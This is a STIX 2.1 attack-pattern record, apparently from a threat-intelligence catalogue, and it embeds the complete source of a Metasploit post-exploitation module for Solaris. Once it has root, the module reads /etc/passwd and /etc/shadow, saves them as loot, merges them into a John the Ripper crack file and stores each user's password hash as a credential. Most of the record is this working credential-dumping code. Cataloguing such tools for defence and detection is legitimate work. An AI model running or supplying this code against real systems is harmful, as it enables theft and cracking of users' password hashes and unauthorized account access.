{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--dae401c5-9f1b-4363-9431-33b9a79f7b6f",
    "created": "2024-08-14T16:32:59.444795Z",
    "modified": "2024-08-14T16:32:59.444799Z",
    "name": "Solaris Gather Dump Password Hashes for Solaris Systems",
    "description": " Post module to dump the password hashes for all users on a Solaris System  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/solaris/gather/hashdump.rb",
            "external_id": "hashdump.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Solaris::Priv\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Solaris Gather Dump Password Hashes for Solaris Systems',\n        'Description' => %q{\n          Post module to dump the password hashes for all users on a Solaris System\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],\n        'Platform' => [ 'solaris' ],\n        'SessionTypes' => [ 'shell' ]\n      )\n    )\n  end\n\n  # Run Method for when run command is issued\n  def run\n    if is_root?\n      passwd_file = read_file('/etc/passwd')\n      shadow_file = read_file('/etc/shadow')\n\n      # Save in loot the passwd and shadow file\n      p1 = store_loot('solaris.shadow', 'text/plain', session, shadow_file, 'shadow.tx', 'Solaris Password Shadow File')\n      p2 = store_loot('solaris.passwd', 'text/plain', session, passwd_file, 'passwd.tx', 'Solaris Passwd File')\n      vprint_good(\"Shadow saved in: #{p1}\")\n      vprint_good(\"passwd saved in: #{p2}\")\n\n      # Unshadow the files\n      john_file = unshadow(passwd_file, shadow_file)\n      john_file.each_line do |l|\n        hash_parts = l.split(':')\n        jtr_format = Metasploit::Framework::Hashes.identify_hash hash_parts[1]\n        if jtr_format.empty? # overide the default\n          jtr_format = 'des,bsdi,crypt'\n        end\n        credential_data = {\n          jtr_format: jtr_format,\n          origin_type: :session,\n          post_reference_name: refname,\n          private_type: :nonreplayable_hash,\n          private_data: hash_parts[1],\n          session_id: session_db_id,\n          username: hash_parts[0],\n          workspace_id: myworkspace_id\n        }\n        create_credential(credential_data)\n        print_good(l.chomp)\n      end\n      # Save pwd file\n      upassf = store_loot('solaris.hashes', 'text/plain', session, john_file, 'unshadowed_passwd.pwd', 'Solaris Unshadowed Password File')\n      print_good(\"Unshadowed Password File: #{upassf}\")\n\n    else\n      print_error('You must run this module as root!')\n    end\n  end\n\n  def unshadow(pf, sf)\n    unshadowed = ''\n    sf.each_line do |sl|\n      pass = sl.scan(/^\\w*:([^:]*)/).join\n      next unless pass !~ /^\\*LK\\*|^NP/\n\n      user = sl.scan(/(^\\w*):/).join\n      pf.each_line do |pl|\n        if pl.match(/^#{user}:/)\n          unshadowed << pl.gsub(/:x:/, \":#{pass}:\")\n        end\n      end\n    end\n    return unshadowed\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'solaris' ]"
    ]
}